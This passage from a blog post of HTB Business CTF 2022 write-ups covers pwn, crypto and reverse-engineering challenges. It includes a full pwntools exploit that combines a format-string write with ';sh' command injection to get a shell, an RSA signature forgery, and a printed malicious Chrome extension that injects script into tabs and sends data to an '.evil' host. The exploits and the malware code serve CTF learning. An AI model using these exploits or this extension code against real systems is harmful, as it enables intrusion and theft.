<p><img src="/images/2022-htb_businessctf/2.png" alt="2.png" /></p>

<p><code class="language-plaintext highlighter-rouge">v131</code> should be more than 0, so if I found right offset of <code class="language-plaintext highlighter-rouge">v131</code>, can be overwritten by <code class="language-plaintext highlighter-rouge">%[offset]$n</code>.</p>

<h3 id="2-after-getting-shell">2. After Getting shell..?</h3>
<ol>
  <li><code class="language-plaintext highlighter-rouge">MKDR ;sh</code> : make directory named <code class="language-plaintext highlighter-rouge">;sh</code>. it’s legal expression in linux.</li>
  <li><code class="language-plaintext highlighter-rouge">CWD ;sh</code> : change working directory to <code class="language-plaintext highlighter-rouge">/home/ctf/;sh</code></li>
  <li><code class="language-plaintext highlighter-rouge">LIST</code> : call <code class="language-plaintext highlighter-rouge">getcwd()</code> =&gt; <code class="language-plaintext highlighter-rouge">/home/ctf/;sh</code> and combine string (result : <code class="language-plaintext highlighter-rouge">ls -al /home/ctf/;sh</code>) !!!SHELL EXECUTED!!!</li>
  <li>In the shell, <code class="language-plaintext highlighter-rouge">cd /home/ctf</code> =&gt; I noticed that <code class="language-plaintext highlighter-rouge">get_flag</code> file’s RUNPATH is <code class="language-plaintext highlighter-rouge">./</code>, so changing working directory to <code class="language-plaintext highlighter-rouge">/home/ctf</code> is necessary.</li>
  <li>In the shell, <code class="language-plaintext highlighter-rouge">./get_flag</code> =&gt; Execute!</li>
  <li>In the shell, <code class="language-plaintext highlighter-rouge">exit</code> =&gt; for receiving results of entire commands.<br />
(because commands is running in <code class="language-plaintext highlighter-rouge">popen</code> process)</li>
</ol>

<h3 id="3-exploit-code">3. Exploit Code</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="c1">#context.log_level = 'debug'
</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"104.248.175.153"</span><span class="p">,</span><span class="mi">30467</span><span class="p">)</span>
<span class="c1">#p = process('./chall')
</span>
<span class="k">def</span> <span class="nf">qwer</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">noRecv</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">noRecv</span><span class="p">:</span>  <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
        <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>

<span class="n">qwer</span><span class="p">(</span><span class="s">"USER ;)"</span><span class="p">)</span>
<span class="n">qwer</span><span class="p">(</span><span class="s">"PASS ;)"</span><span class="p">)</span>

<span class="n">qwer</span><span class="p">(</span><span class="s">"BKDR %p %p %p %p %p %p %p"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"(nil) 0x"</span><span class="p">)</span>
<span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x66c0</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>

<span class="n">pay</span> <span class="o">=</span> <span class="s">b'BKDR'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="s">b' %1035$n'</span>

<span class="c1">#pause()
</span><span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x28</span><span class="o">-</span><span class="mi">3</span><span class="p">,</span> <span class="s">b'b'</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="s">b"ASDF"</span>
<span class="n">qwer</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="c1">#qwer("STOR .profile")
#qwer("alias ls='sh;ls'".ljust(0x1000, 'a') + 'LIST', True)
#p.shutdown('send')
</span>
<span class="n">qwer</span><span class="p">(</span><span class="s">"MKDR ;sh"</span><span class="p">)</span>
<span class="n">qwer</span><span class="p">(</span><span class="s">"CWD ;sh"</span><span class="p">)</span>
<span class="n">qwer</span><span class="p">(</span><span class="s">"LIST"</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"cd /home/ctf"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"./get_flag"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"exit"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Flag is <code class="language-plaintext highlighter-rouge">HTB{Private_Key_H@McQfTjWnZr4u7x!A%D*G-KaNdRgUkX}</code>.</p>

<hr />

<h2 id="pwn--opendoor">PWN : OpenDoor</h2>
<p>! REDACTED !<br />
Exploit Code : <a href="https://gist.github.com/bww9641/b55628e52157fd04beb25155c951beeb" target="_blank">https://gist.github.com/bww9641/b55628e52157fd04beb25155c951beeb</a></p>

<hr />

<h2 id="crypto--bbgun06">CRYPTO : BBGun06</h2>
<h3 id="1-analyze-2">1. Analyze</h3>

<p>BBGun06 / revenge has same <code class="language-plaintext highlighter-rouge">verify(self,message, signature)</code> code:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">verify</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">signature</span><span class="p">):</span>
        <span class="n">keylength</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">n</span><span class="p">))</span>
        <span class="n">decrypted</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">signature</span><span class="p">)</span>
        <span class="n">clearsig</span> <span class="o">=</span> <span class="n">decrypted</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="n">keylength</span><span class="p">,</span> <span class="s">"big"</span><span class="p">)</span>

        <span class="n">r</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nb">compile</span><span class="p">(</span><span class="s">b'</span><span class="se">\x00\x01\xff</span><span class="s">+?</span><span class="se">\x00</span><span class="s">(.{15})(.{20})'</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>
        <span class="n">m</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">match</span><span class="p">(</span><span class="n">clearsig</span><span class="p">)</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">m</span><span class="p">:</span>
            <span class="k">raise</span> <span class="n">VerificationError</span><span class="p">(</span><span class="s">'Verification failed'</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">m</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="bp">self</span><span class="p">.</span><span class="n">asn1</span><span class="p">:</span>
            <span class="k">raise</span> <span class="n">VerificationError</span><span class="p">(</span><span class="s">'Verification failed'</span><span class="p">)</span>

        <span class="k">if</span> <span class="n">m</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">!=</span> <span class="n">sha1</span><span class="p">(</span><span class="n">message</span><span class="p">).</span><span class="n">digest</span><span class="p">():</span>
            <span class="k">raise</span> <span class="n">VerificationError</span><span class="p">(</span><span class="s">'Verification failed'</span><span class="p">)</span>

        <span class="k">return</span> <span class="bp">True</span>
</code></pre></div></div>

<p>And en/decrypt function changes signature code(byte) to long by using <code class="language-plaintext highlighter-rouge">bytes_to_long</code> to calculate with integer.<br />
Decrypted message is same when I give bytes string that has same integer result. That means, <code class="language-plaintext highlighter-rouge">dec("0001") == dec("01")</code>.
It’s simple!<br />
send given signature with <code class="language-plaintext highlighter-rouge">00</code> :D, <code class="language-plaintext highlighter-rouge">00 + sig</code><br />
revenge prob has the same solving process lol:) See below.</p>
<h3 id="2-exploit-manual">2. Exploit (Manual)</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// for_BBGun06
signature: 59b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10

...
// for_BBGun06 revenge
Enter the signature as hex: 0059b980d833bffec9b1fe51a5256e66cca1e56e92ade292148edbb9421b50ce877f8bb052bd6c0d011fc06b80db42425bc5ce757d393d63a99215088c03fb1623c7fc9efbfbefde2b86072b7f3e2f8d7bd9c32c1752c3360e8e578e447f7c9445da99a39365bebf80e7975c05db7a74e736359a334a52e55c60329a7584b666e756620775b88987b918bb3d278216686ed7e12dc6807aaaab4c70ba3802c31b925fccf3f52b0c890cd24d737416b7cbd7fab1da146b974be4905ddf18602f29dc5233110f1cb657853b5aa0c7bd65cbc3bf9244e92f1cb48d103c8e524eae0cc5c1b966a6ff23e21b226e0d24b298433c059935bdf5dfa8836864232b2b573b10
HTB<span class="o">{</span>8131ch3n84ch32<span class="s1">'06_519n47u23_f02932y}
</span></code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signature: 866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f

...

Enter the signature as hex: 00866753b3e8009d9a365d11b9d334be86178de27f697d1f2e849222c557776f9befecee7c8adde061f226a2260b441e8df47a1c854be940a6b7d88029f32614121b72e10efd3b10609d66bff26c459da939c89e28117a5f1c761d3805cac6564b090323cdf8399e632c48d3db48e1a0c774d4f14fb673bb02385fc74cafc8b6d3ff0c2ac9247ba62ebd27fc798aa1ca29d88d2ce8fd79d3c01975964385806e85138a5175092cdac710aab71d000c2e77bb9f15cfbe82ff2a20416ea32ea388c1c5a3d6a8570f74a4eafbf4f46dda39167ad8a93aecc345f24d5e8134b260ce2c75405804ab546576b5492fbb76cad9da56939a3653d92f4320d4fddaa698864f
HTB<span class="o">{</span>1t_w@s_5upp0s3d_to_b3_8131ch3n84ch32<span class="s1">'s}
</span></code></pre></div></div>

<hr />

<h2 id="crypto--elelgamal">CRYPTO : ElElGamal</h2>
<p>I didn’t know about ElGamal in cryptography, so I searched a lot.<br />
writing…
—</p>

<h2 id="rev--breakout">REV : BreakOut</h2>

<h3 id="1-flag-recovering">1. FLAG Recovering</h3>
<ol>
  <li>Connect <code class="language-plaintext highlighter-rouge">URL:port/proc/self/maps</code> and see what prob should be the base program. <code class="language-plaintext highlighter-rouge">/bkd</code> is running!</li>
  <li>Download <code class="language-plaintext highlighter-rouge">bkd</code> file in website.</li>
  <li>Realize it’s web server made by C++.</li>
  <li>Find <code class="language-plaintext highlighter-rouge">secretGet</code> function and get flag.</li>
</ol>

<h3 id="2-get-flag">2. Get FLAG</h3>
<p><img src="/images/2022-htb_businessctf/3.png" alt="3.png" /></p>

<p>Flag is <code class="language-plaintext highlighter-rouge">HTB{th3_pr0c_f5_15_4_p53ud0_f1l35y5t3m_wh1ch_pr0v1d35_4n_1nt3rf4c3.....}</code>.</p>

<hr />

<h2 id="rev--chromeminer">REV : ChromeMiner</h2>

<p>Fully obfuscated js Challenge.</p>

<h3 id="1-recover-with-hand">1. Recover with hand</h3>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nx">iF</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="dl">'</span><span class="s1">injected</span><span class="dl">'</span> <span class="k">in</span> <span class="nb">document</span><span class="p">))</span> <span class="p">{</span>
    <span class="nb">document</span><span class="p">[</span><span class="dl">'</span><span class="s1">injected</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">setInterval</span><span class="dl">'</span><span class="p">](</span><span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="nx">y</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">](</span><span class="mi">64</span><span class="p">);</span>
      <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">getRandomValues</span><span class="dl">'</span><span class="p">](</span><span class="nx">y</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">TextDecoder</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">utf-8</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">decode</span><span class="dl">'</span><span class="p">](</span><span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">digest</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">sha-256</span><span class="dl">'</span><span class="p">,</span> <span class="nx">y</span><span class="p">))[</span><span class="dl">'</span><span class="s1">endsWith</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">chrome</span><span class="dl">'</span><span class="p">))</span> <span class="p">{</span>
        <span class="nx">j</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">](</span><span class="nx">y</span><span class="p">[</span><span class="dl">'</span><span class="s1">byteLength</span><span class="dl">'</span><span class="p">]</span> <span class="o">+</span> <span class="p">(</span><span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">digest</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">sha-256</span><span class="dl">'</span><span class="p">,</span> <span class="nx">y</span><span class="p">))[</span><span class="dl">'</span><span class="s1">byteLength</span><span class="dl">'</span><span class="p">]);</span>
        <span class="nx">j</span><span class="p">[</span><span class="dl">'</span><span class="s1">set</span><span class="dl">'</span><span class="p">](</span><span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">](</span><span class="nx">y</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
        <span class="nx">j</span><span class="p">[</span><span class="dl">'</span><span class="s1">set</span><span class="dl">'</span><span class="p">](</span><span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">](</span><span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">digest</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">sha-256</span><span class="dl">'</span><span class="p">,</span> <span class="nx">y</span><span class="p">)),</span> <span class="nx">y</span><span class="p">[</span><span class="dl">'</span><span class="s1">byteLength</span><span class="dl">'</span><span class="p">]);</span>
        <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">fetch</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">hxxps://qwertzuiop123.evil/</span><span class="dl">'</span> <span class="o">+</span> 
        <span class="p">[...</span><span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">](</span><span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">encrypt</span><span class="dl">'</span><span class="p">]({[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">]:</span> <span class="dl">'</span><span class="s1">AES-CBC</span><span class="dl">'</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">iv</span><span class="dl">'</span><span class="p">]:</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">TextEncoder</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">utf-8</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">encode</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">_NOT_THE_SECRET_</span><span class="dl">'</span><span class="p">)},</span> <span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">importKey</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">raw</span><span class="dl">'</span><span class="p">,</span> <span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">decrypt</span><span class="dl">'</span><span class="p">]({[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">]:</span> <span class="dl">'</span><span class="s1">AES-CBC</span><span class="dl">'</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">iv</span><span class="dl">'</span><span class="p">]:</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">TextEncoder</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">utf-8</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">encode</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">_NOT_THE_SECRET_</span><span class="dl">'</span><span class="p">)},</span> <span class="k">await</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">subtle</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">importKey</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">raw</span><span class="dl">'</span><span class="p">,</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">TextEncoder</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">utf-8</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">encode</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">_NOT_THE_SECRET_</span><span class="dl">'</span><span class="p">),</span> <span class="p">{[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">]:</span> <span class="dl">'</span><span class="s1">AES-CBC</span><span class="dl">'</span><span class="p">},</span> <span class="kc">true</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">decrypt</span><span class="dl">'</span><span class="p">]),</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Uint8Array</span><span class="dl">'</span><span class="p">]((</span><span class="dl">'</span><span class="s1">E242E64261D21969F65BEDF954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8</span><span class="dl">'</span><span class="p">)[</span><span class="dl">'</span><span class="s1">match</span><span class="dl">'</span><span class="p">](</span><span class="sr">/../g</span><span class="p">)[</span><span class="dl">'</span><span class="s1">map</span><span class="dl">'</span><span class="p">](</span><span class="nx">h</span> <span class="o">=&gt;</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">parseInt</span><span class="dl">'</span><span class="p">](</span><span class="nx">h</span><span class="p">,</span> <span class="mi">16</span><span class="p">)))),</span> <span class="p">{[</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">]:</span> <span class="dl">'</span><span class="s1">AES-CBC</span><span class="dl">'</span><span class="p">},</span> <span class="kc">true</span><span class="p">,</span> <span class="p">[</span><span class="dl">'</span><span class="s1">encrypt</span><span class="dl">'</span><span class="p">]),</span> <span class="nx">j</span><span class="p">))][</span><span class="dl">'</span><span class="s1">map</span><span class="dl">'</span><span class="p">](</span><span class="nx">x</span> <span class="o">=&gt;</span> <span class="nx">x</span><span class="p">[</span><span class="dl">'</span><span class="s1">toString</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">padStart</span><span class="dl">'</span><span class="p">](</span><span class="mi">2</span><span class="p">,</span> <span class="dl">"</span><span class="s2">0</span><span class="dl">"</span><span class="p">))[</span><span class="dl">'</span><span class="s1">join</span><span class="dl">'</span><span class="p">](</span><span class="dl">""</span><span class="p">));</span>
      <span class="p">}</span>
    <span class="p">},</span> <span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="p">;</span>

<span class="nx">chrome</span><span class="p">[</span><span class="dl">'</span><span class="s1">tabs</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">onUpdated</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">addListener</span><span class="dl">'</span><span class="p">]((</span><span class="nx">tabVar</span><span class="p">,</span> <span class="nx">changeInfo</span><span class="p">,</span> <span class="nx">tab</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span> <span class="k">in</span> <span class="nx">tab</span> <span class="o">&amp;&amp;</span> <span class="nx">tab</span><span class="p">[</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">]</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">tab</span><span class="p">[</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">startsWith</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">https://</span><span class="dl">'</span><span class="p">)</span> <span class="o">||</span> <span class="nx">tab</span><span class="p">[</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">startsWith</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">http://</span><span class="dl">'</span><span class="p">)))</span> <span class="p">{</span>
    <span class="nx">chrome</span><span class="p">[</span><span class="dl">'</span><span class="s1">scripting</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">executeScript</span><span class="dl">'</span><span class="p">]({[</span><span class="dl">'</span><span class="s1">target</span><span class="dl">'</span><span class="p">]:</span> <span class="p">{[</span><span class="dl">'</span><span class="s1">tabId</span><span class="dl">'</span><span class="p">]:</span> <span class="nx">tab</span><span class="p">[</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">]},</span> <span class="na">function</span><span class="p">:</span> <span class="nx">iF</span><span class="p">});</span>
  <span class="p">}</span>
<span class="p">});</span>
</code></pre></div></div>

<h3 id="2-decrypt-with-aes-256">2. Decrypt with AES-256</h3>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="s">b'_NOT_THE_SECRET_'</span><span class="p">,</span><span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span><span class="s">b'_NOT_THE_SECRET_'</span><span class="p">)</span>
<span class="o">&lt;</span><span class="n">Crypto</span><span class="p">.</span><span class="n">Cipher</span><span class="p">.</span><span class="n">AES</span><span class="p">.</span><span class="n">AESCipher</span> <span class="nb">object</span> <span class="n">at</span> <span class="mh">0x7fae19feb790</span><span class="o">&gt;</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="s">b'_NOT_THE_SECRET_'</span><span class="p">,</span><span class="n">AES</span><span class="p">.</span><span class="n">MODE_CBC</span><span class="p">,</span><span class="s">b'_NOT_THE_SECRET_'</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">cipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="s">b'</span><span class="se">\xe2</span><span class="s">B</span><span class="se">\xe6</span><span class="s">Ba</span><span class="se">\xd2\x19</span><span class="s">i</span><span class="se">\xf6</span><span class="s">[</span><span class="se">\xed\xf9</span><span class="s">T</span><span class="se">\x90\n\x99</span><span class="s">R</span><span class="se">\t\t\x9f\xb6\xc3\xc6\x82\xc0\xd9\xc4\xb2</span><span class="s">u</span><span class="se">\xb1\xc2\x12\xbc\x18\x8e\x08\x82\xb6\xbe</span><span class="s">r</span><span class="se">\xc7</span><span class="s">I!</span><span class="se">\x12</span><span class="s">A</span><span class="se">\x18\x7f\xa8</span><span class="s">'</span><span class="p">)</span>
<span class="s">b'HTB{__mY_vRy_owN_CHR0me_M1N3R__}</span><span class="se">\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10</span><span class="s">'</span>
</code></pre></div></div>

<hr />

<h2 id="for--linas-invitation">FOR : Lina’s Invitation</h2>
<p>writing….</p>


</br></br><hr>
<div id="disqus_thread"></div>
<script>
    /**
    *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
    *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
    /*
    var disqus_config = function () {
    this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
    this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
    */
    function disqus() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://ainsetin.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    };
    disqus();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

        
          <button title="Toggle Theme" class="theme-toggle">
  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
    <path d="
             M 16 0
             A 16 16 0 0 0 16 32
             z">
    </path>
  </svg>
</button>

        
        <div class="credits">&copy;&nbsp;2023&nbsp;Ainsetin
          &nbsp;
          •
          &nbsp;Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
          &nbsp;
          •
          &nbsp;Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>
        </div>
      </div>
    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
</html>
